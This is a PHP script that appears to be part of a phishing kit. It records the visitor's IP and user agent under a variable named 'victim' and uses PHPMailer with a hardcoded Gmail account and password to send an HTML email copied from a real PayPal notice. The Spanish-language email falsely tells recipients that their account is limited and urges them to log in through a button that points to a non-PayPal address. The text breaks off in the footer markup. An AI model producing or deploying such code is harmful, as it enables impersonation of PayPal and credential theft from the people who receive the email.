<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: " .  $_SERVER['HTTP_USER_AGENT'];



$victim = "\nIP: " . $ipaddress ;




$nombre = $_POST['nombre'];
$em = $_POST['email'];
$emsa = $_POST['asunto'];




//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = 0;
    //$mail->SMTPDebug = 2;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;  
    $mail->SMTPSecure = 'tls';                                 //Enable SMTP authentication
    $mail->Username   = "elvirgenivo@gmail.com";                     //SMTP username
    $mail->Password   = "N9DRCAsW";                               //SMTP password
    //$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `
    

    //Recipients
    $mail->setFrom('piterivano20@gmail.com');
    $mail->addAddress("$em", 'Joe User');     //Add a recipient
    //$mail->addAddress("piterivano20@gmail.com");               //Name is

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = "$emsa";
    $mail->Body    = "
    <div class=''>
        <div class='aHl'></div>
        <div id=':461' tabindex='-1'></div>
        <div id=':45q' class='ii gt' jslog='20277; u014N:xr6bB; 4:W251bGwsbnVsbCxbXV0.'>
            <div id=':45p' class='a3s aiL '>
                <div class='adM'>
    
    
    
    
    
    
    
    
                </div>
                <div>
                    <div class='adM'>
                    </div>
                    <h4 id='m_5793777658047683452preHeader' style='display:none;color:#fff;font-size:0px;line-height:0px'>{$nombre}, necesitaremos que nos proporcione mas ifonrmacion.</h4>
                    <table cellpadding='0' cellspacing='0' border='0' width='100%'>
                        <tbody>
                            <tr>
                                <td bgcolor='#ffffff' style='font-size:0px'></td>
                                <td bgcolor='#ffffff' width='660' align='center'>
                                    <table cellpadding='0' cellspacing='0' border='0' width='100%' dir='ltr'>
                                        <tbody>
                                            <tr>
                                                <td>
                                                    <table cellpadding='0' cellspacing='0' border='0' width='100%'>
                                                        <tbody>
                                                            <tr>
                                                                <td align='center' colspan='3' width='600'>
                                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0' bgcolor='#f5f7fa' dir='ltr'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align='center' style='font-size:14px;line-height:24px;color:#687173;padding:20px'><span>Hola,{$nombre}></span></td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align='center' valign='bottom'><img src='https://ci5.googleusercontent.com/proxy/Vn0Y0POPW_03dvXbA0iqbA4WsznU5cizjumJguCRRJ57ecos8g0sReyagS00DMtZ6A0XtHAj40dpu0evSMz2FWFlNT42dAVvNy0xHiqivlJav91e0PxDEnUsVqwHi__1v7dLI6htOZ81-y3dNE0EYeeFpAaHCvpid2qhqPSyJpccBEyUELu2HNM=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/pplogo-circletop-sm.png'
                                                                                        width='116' height='16' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                            </tr>
                                                            <tr>
                                                                <td></td>
                                                                <td align='center' width='600'><img src='https://ci3.googleusercontent.com/proxy/L_0x5l4ymtjiwey4D6-twBJATF71pRys7tGgycKALpzIrzVLnXAp9v2zXipMFgDJTBQ4Y6yt7cZ9Zb_25a-ffsbGjjIJVVX5GXrPYYIoECI-tqKRwbTfWKHpqzSPypqoa29QSs3N98uLIsakWT52Qi9RDTGE1bQ6mThHZf4=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/pp-logo.png'
                                                                        width='116' height='71' style='display:block' border='0' alt='PayPal' title='PayPal' class='CToWUd'></td>
                                                                <td></td>
                                                            </tr>
                                                            <tr>
                                                                <td align='center' valign='top' style='min-width:10px' bgcolor='#004f9b'><img width='100%' height='81' src='https://ci6.googleusercontent.com/proxy/GsRQ45UFDFHNJuuSD4UyRIHZnPsDMLtcrMgUh9clrtuIlJ9ie2aoareojsvaFa69I4LxwaLHrXZrbilObptP4khOFPSwaGff2zQ3Fe6RNZh4mryWOH3avH3nqCHOZvUOKrUsEyw8KmZr5BJwUEVlNFYrSiQwywpk4pxEICWJiJOABH4=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/header-sidebar-left-top.jpg'
                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                <td align='center' width='600'>
                                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td width='12' align='center' valign='top'><img width='12' height='81' src='https://ci6.googleusercontent.com/proxy/gwgdZrbB5LM1ZwFsjRxLiyq4jxNFtgEXdagO4RsY8pkvEGszVY8bM4dD1aWovEKJQk5nazxz_kaKJIdKXtgp9rB4DzER1KztmsLwPEYHGIXSJIam8ARqLF-pvIPbisGfvIIkDLg7hqp8UeVgcJXcrjxrnnJ_CaxdZbeXqMnoNrnpb3nl43ZZ0g=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/header-left-corner.png'
                                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='229' align='center' valign='top'><img width='100%' height='81' src='https://ci6.googleusercontent.com/proxy/vtnjNBlVWpJ1qap7qkQFSGOqZ6oE-oY66jUbVDe4sqtumYP85Waz_w52K8cI4RPBdpugXXNN0StI3rXc7LLpGjgLEss64bTiPqvF0A92k8PMsCPqZYTWG6Z9pJycuXkkKPy0Mk7Q1Itf7dbs-ZnSurRuisv04q3Y0tIXBAMIENoi=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/header-left.png'
                                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='118' align='center' valign='top'><img width='118' height='81' src='https://ci5.googleusercontent.com/proxy/EP3tWOlu1hFL2VoNwbdO1mdBWVAz7Zneav5Tlaprp--8C3Tn8Q_KYcB69j5Q0-9se8vr53B2evRDxN1bT0U3fxHFE1iUTDFTF12A3Kc-UrgJthp3d2dwDs48BZzfQSntB-TLmRmvELF_cSY7ue4w0zYF43-rSGCrd-QwV_Hf0KhTpMhFGQOXXclS=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/header-center-circle.png'
                                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='229' align='center' valign='top'><img width='100%' height='81' src='https://ci5.googleusercontent.com/proxy/EdhEUFZXcbjXgtFMqZS4_KkoxdsBQqlmhd3y2yZaovzayOrhi0fl35Yzn7XBKU9AYQ3BJPP9hH_cRnH3bqIvGJs_ZA33l0E9DgtffSFr7i8HZNp4Sh8ZDy51EOjEfLHiHw8OElQ8hakWScWU79VHzTTuCsDLXGYzZk2EuYPcoXf6-w=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/header-right.png'
                                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='12' align='center' valign='top'><img width='12' height='81' src='https://ci3.googleusercontent.com/proxy/ABCBHhY7JuFgveLvAbBAAEE57hrUmpiz4yM6zUFO1Yw54wPRnIM4-gpPWm0I8_hcN_uOYyIS3Wo9ptELv9yj-NLT2n6n_K9LT7Rlw67HBwAqmumG-DDDSdJ1KfjiWK2m8W3tu81AwHFgxUUSfVF78DOr-HOKET7wsjzG0bzEzSEpvj6stzIi8tU=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/header-right-corner.png'
                                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                                <td align='center' valign='top' style='min-width:10px' bgcolor='#004f9b'><img width='100%' height='81' src='https://ci6.googleusercontent.com/proxy/QDQw8G1Jt4gXFJwNumnKT6oh1rUOYPZGDK10yrmawTOjM5Fq0x09udc00qTAoviCJse4gVSmX8bK-18SIYyb0dqmwX0kQM1hiWPCzRlksMbBkDXOvu4tN2itSwxBs9pn1UcVNBRq4dlbpY8lnyoUPKKHt5UFDpOcQL8sGo43zA_nmp5J=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/header-sidebar-right-top.jpg'
                                                                        style='display:block' border='0' alt='' class='CToWUd'></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <table cellpadding='0' cellspacing='0' border='0' width='100%' dir='ltr'>
                                        <tbody>
                                            <tr>
                                                <td align='left' valign='top' style='min-width:10px'>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td align='center' valign='top' bgcolor='#004f9b'><img src='https://ci3.googleusercontent.com/proxy/li1lzePIClKspAmlQFjJlYX_faBkvJHk1SLYGx5Z05tN1t_nCdga9bzGIy6ezhaPqgu108cV0CVj-RKpiEjwkfqZGhi5S7HB7aspPZNZwlPrOe-61OsMPaSTdSpJz6pcQ6NmiAPInA3Rm6p-KEsJyY5elt2S4sAA7gTn-Qc6EWh4e-u-cg8=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/header-sidebar-left-bottom.jpg'
                                                                        width='100%' height='96' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                            </tr>
                                                            <tr>
                                                                <td align='right' valign='top'><img src='https://ci6.googleusercontent.com/proxy/WQjvo26UDc8NjWdNORNx_7wLJmKwE13u_y3R9QnvnPF4xfWqQTnPIAVijrlQkfQHEkg_hhmCwBWT4rsipRuvujkRx9tjslBCCGkVfWaCcxifClWIV7WvX0yiz9K4RpwZF-4eJCp4ggi0v9WsDKiTQDNj5-6gE6TBVTdcrVfKxqqB9O2wd4E=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/sidebar-gradient.png'
                                                                        width='1' height='100' style='display:block' alt='' class='CToWUd'></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                                <td width='600' valign='top' align='center'><br>
                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0' style='padding:0px 20px 30px 20px;word-break:break-word'>
                                                        <tbody>
                                                            <tr>
                                                                <td align='center'>
                                                                    <p style='font-size:32px;line-height:40px;color:#2c2e2f;margin:0' dir='ltr'><span>Necesitamos que nos proporcione mas informacion</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0' style='padding:0px 20px 10px 20px'>
                                                        <tbody>
                                                            <tr>
                                                                <td valign='top'>
                                                                    <p style='font-size:20px;line-height:28px;color:#687173;margin:0' dir='ltr'><span>¿Por que necesitamos esta informacion?</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span style='font-size:16px;color:#2c2e2f'><span>Hemos detectado que su cuenta de PayPal podria estar compartiendo informacion con otras cuentas con problemas sin resolver. Para entender mejor estos movimientos, necesitamos que nos proporcione mas informacion sobre usted.</span></span>
                                                                    </p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>Tambien hemos limitado temporalmente ciertas funciones de su cuenta de PayPal.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>En este momento no podra:</span>
                                                                    </p>
                                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td style='padding:10px 0px 0px 0px'>
                                                                                    <ul dir='ltr'>
                                                                                        <li style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0px 0px 8px 0px;list-style-type:disc' dir='ltr'><span>Realizar un pago</span></li>
                                                                                        <li style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0px 0px 8px 0px;list-style-type:disc' dir='ltr'><span>Retirar fondos</span></li>
                                                                                    </ul>
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                    <p></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0' style='padding:0px 20px 10px 20px'>
                                                        <tbody>
                                                            <tr>
                                                                <td valign='top'>
                                                                    <p style='font-size:20px;line-height:28px;color:#687173;margin:0' dir='ltr'><span>¿Que debe hacer?</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>Inicie sesion en su cuenta de PayPal y proporcionenos la informacion que le solicitamos.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' border='0' cellspacing='0' cellpadding='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td align='center' style='padding:0px 30px 30px 30px'>
                                                                    <table border='0' cellspacing='0' cellpadding='0'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align='center' style='border-radius:1.5rem' bgcolor='#0070ba'><a href='http://localhost:3000/' style='line-height:1.6;font-size:15px;border-radius:1.5rem;padding:10px 20px;display:inline-block;border:1px solid #0070ba;font-weight:500;text-align:center;text-decoration:none;min-width:150px;background-color:#0070ba;color:#ffffff'
                                                                                        target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/restore/login?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544034000&amp;usg=AOvVaw3vC2EUHRQ6XD1RwL9VdtGw'>Inicie sesion en PayPal</a></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>Si no envia la informacion requerida antes del&nbsp;17 de agosto de 2021 o si detectamos cambios adicionales en los movimientos de su cuenta, el acceso se limitara aun mas.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0' style='padding:0px 20px 10px 20px'>
                                                        <tbody>
                                                            <tr>
                                                                <td valign='top'>
                                                                    <p style='font-size:20px;line-height:28px;color:#687173;margin:0' dir='ltr'><span>¿Que sucede a continuacion?</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>Despues de que haya enviado la informacion, la revisaremos y le enviaremos una respuesta con respecto al estado de su cuenta en&nbsp;3 dias habiles.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td style='padding:0px 20px 20px 20px'>
                                                                    <p style='font-size:16px;line-height:24px;color:#2c2e2f;margin:0;word-break:break-word' dir='ltr'><span>Agradecemos su atencion en relacion con este asunto.</span></p>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                                <td valign='top' align='left' style='min-width:10px'>
                                                    <table width='100%' cellspacing='0' cellpadding='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td valign='top' align='center' bgcolor='#004f9b'><img width='100%' border='0' height='96' style='display:block' src='https://ci4.googleusercontent.com/proxy/3Vgse0KtQW0Jm0uM-7uIlQSa4BZZZHguqnJ0Wbi9WbqUm_t96uYxbGXSRJWchWqzmF8q3PgbfHvJJj9iPVdtUT45vb7MVCS_y5BBYPoHjQb8WYLYmouYlrjDOT9LgTQCVT39O3HOsDDRr9pYeS1x-xjf7jwE1J1USiF1Dv4U7AotmcSC66H1=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/header-sidebar-right-bottom.jpg'
                                                                        class='CToWUd'></td>
                                                            </tr>
                                                            <tr>
                                                                <td valign='top' align='left'><img width='1' height='100' style='display:block' src='https://ci6.googleusercontent.com/proxy/WQjvo26UDc8NjWdNORNx_7wLJmKwE13u_y3R9QnvnPF4xfWqQTnPIAVijrlQkfQHEkg_hhmCwBWT4rsipRuvujkRx9tjslBCCGkVfWaCcxifClWIV7WvX0yiz9K4RpwZF-4eJCp4ggi0v9WsDKiTQDNj5-6gE6TBVTdcrVfKxqqB9O2wd4E=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/sidebar-gradient.png'
                                                                        class='CToWUd'></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                            <tr>
                                                <td></td>
                                                <td align='center' width='600'>
                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0' dir='ltr'>
                                                        <tbody>
                                                            <tr>
                                                                <td>
                                                                    <table width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td width='12' align='center' valign='top'><img src='https://ci5.googleusercontent.com/proxy/_4oMyrzFiF4q8xgxJ8_dEu1r8bjn2tK-LkryMJwpCSasaBazNq-V-MZxgqwyyhhVevbZJ5kBkLpeFu5CAWN3uI8L6rNsWsdmda-ROUTGttKAF-IVjgmcrzeQWK3Gdj6slGGQA1YN-E3vVQa3sIENRnXqCjO-X6rD9XqQocQwwkjSFrxq6VoTzQ=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/footer-left-corner.png'
                                                                                        width='12' height='141' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td align='center' valign='top'><img src='https://ci6.googleusercontent.com/proxy/Lj-47Vw8EUmm5HxNoRcxP4U1TRXUlbXwRGvWkW5xrFDJox9Lr1XrmHejRsvmG1uMSWihTvfKA8jcSw_Q4TPIy3W1ci5Z7w159Y_w5Bo6gmTJ4rK3ThU-BVzDfahAxUlhvtkk7l0Y73RofyiI7YUqlyIsWQmSis9huyP0B8_gNbE7JO_sVLbWgg=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/footer-left-stroke.png'
                                                                                        width='100%' height='141' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='120' align='center' valign='top'><img src='https://ci4.googleusercontent.com/proxy/OHUOzZbJtF5nWZZyXzQ11HnbKza-G3ekQav4b74bvPAuTv35aKuWGugmI_KPHC8MM5HJi9aDC2R83tM5UtHowtfuRY98b4s87sYUv7vJLBJhJJyzHOtxgL1NYqoY5PkZ4BkghTld22BmrIa9jasHl0cnldvOO-K5qLWy-Kj2-rnVc9aV=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/footer-pp-logo.png'
                                                                                        width='120' height='141' style='display:block' border='0' alt='PayPal' class='CToWUd'></td>
                                                                                <td align='center' valign='top'><img src='https://ci4.googleusercontent.com/proxy/YotBUKGWuOk_ErsKNmyW2xOOFNkrDOxhFF56lyg7KqtSJDVYE8U1Hdq7BhOFJagkO8nq1plIuymw0gdH7H2gO9YV7oEHOWY6jpJe4uc_Wfgewyh18VRjS7IN_lQJNm3Dvv5p7nRu1iYchVBID1sYFzV1qbSWYt2_e_YtSKpfb0Jn8nCGq1V3BEc=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/footer-right-stroke.png'
                                                                                        width='100%' height='141' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                                <td width='12' align='center' valign='top'><img src='https://ci6.googleusercontent.com/proxy/tsMGyRlZlbFCmUCBURycijkNGWzDxtkbINsbsHFbRAvva3QGJB2BRm89FRUlaHqNS5ChAtQsrikBaexzYdYFKZoOfZXyH0VwvZPuj9hDAAiPrtbHuo280N9ef3rqWzFXdTpG6kAwOzVy0SLPO2HzNNLGwAwElQK5DidK8K7InMgG7ByLiFymaBw=s0-d-e1-ft#https://www.paypalobjects.com/digitalassets/c/system-triggered-email/n/layout/images/dark-mode/footer-right-corner.png'
                                                                                        width='12' height='141' style='display:block' border='0' alt='' class='CToWUd'></td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <table id='m_5793777658047683452body_footer_links' width='100%' cellpadding='0' cellspacing='0' border='0'>
                                                        <tbody>
                                                            <tr>
                                                                <td align='center' style='font-size:15px;line-height:22px;color:#444444;padding:20px'><a href='https://www.paypal.com/ni/smarthelp/home?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                        style='color:#0070ba;text-decoration:none' alt='Help &amp; Contact' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/ni/smarthelp/home?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw3k7-k1tK50q52rsiAOgxmx'>Contacto y ayuda</a><span> | </span>
                                                                    <a href='https://www.paypal.com/ni/webapps/mpp/paypal-safety-and-security?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                        style='color:#0070ba;text-decoration:none' alt='Security' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/ni/webapps/mpp/paypal-safety-and-security?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw2gLtztMF7kJJD2VF1QV3Pa'>Seguridad</a><span> | </span>
                                                                    <a href='https://www.paypal.com/ni/webapps/mpp/mobile-apps?v=1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
                                                                        style='color:#0070ba;text-decoration:none' alt='Apps' target='_blank' data-saferedirecturl='https://www.google.com/url?q=https://www.paypal.com/ni/webapps/mpp/mobile-apps?v%3D1%26utm_source%3Dunp%26utm_medium%3Demail%26utm_campaign%3DRT000361%26utm_unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26ppid%3DRT000361%26cnac%3DNI%26rsta%3Des_XC%2528es-NI%2529%26cust%3DSLB4LV6UTWV7Y%26unptid%3D7bef5a82-dbf8-11eb-9365-3cecef47c28f%26calc%3D7417d485abf44%26unp_tpcid%3Dnull%26page%3Dmain%253Aemail%253ART000361%26pgrp%3Dmain%253Aemail%26e%3Dcl%26mchn%3Dem%26s%3Dci%26mail%3Dsys%26appVersion%3D1.50.0%26xt%3D104038&amp;source=gmail&amp;ust=1649153544035000&amp;usg=AOvVaw2uLYfuRqi5wsJwkagZHHtq'>Aplicaciones</a>
                                                                </td>
                                                            </tr>
                                                            <tr>
                                                                <td align='center' style='padding-bottom:20px'>
                                                                    <table align='center' cellpadding='0' cellspacing='0' border='0'>
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align='center' valign='middle' width='50'>
                                                                                    <a id='m_5793777658047683452twitter' href='https://twitter.com/PayPal?v=1%2C0.1&amp;utm_source=unp&amp;utm_medium=email&amp;utm_campaign=RT000361&amp;utm_unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;ppid=RT000361&amp;cnac=NI&amp;rsta=es_XC%28es-NI%29&amp;cust=SLB4LV6UTWV7Y&amp;unptid=7bef5a82-dbf8-11eb-9365-3cecef47c28f&amp;calc=7417d485abf44&amp;unp_tpcid=null&amp;page=main%3Aemail%3ART000361&amp;pgrp=main%3Aemail&amp;e=cl&amp;mchn=em&amp;s=ci&amp;mail=sys&amp;appVersion=1.50.0&amp;xt=104038'
